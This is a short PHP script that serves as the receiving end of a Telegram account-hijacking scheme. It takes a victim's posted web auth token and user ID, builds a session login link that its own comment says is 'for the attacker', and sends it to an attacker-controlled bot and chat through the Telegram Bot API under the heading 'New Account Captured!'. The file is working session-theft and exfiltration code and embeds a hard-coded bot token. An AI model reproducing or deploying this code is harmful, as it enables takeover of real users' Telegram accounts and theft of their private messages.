<?php
// CONFIGURATION
$botToken = "8987128710:AAEjSu0OtpS0MF6MSya6whdcUtYcieAMW4o"; 
$chatId = "8774267626";

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data && isset($data['token'])) {
    $token = $data['token'];
    $uid = $data['uid'] ?? 'Unknown';
    
    // Construct the full login URL for the attacker
    $loginUrl = "https://web.telegram.org/a/#tgWebAuthToken=" . $token . "&tgWebAuthUserId=" . $uid;
    
    $message = "🚀 **New Account Captured!**\n\n";
    $message .= "UserID: `{$uid}`\n";
    $message .= "Login Link:\n`{$loginUrl}`";

    // Send to Telegram Bot API
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_exec($ch);
    curl_close($ch);
}
?>
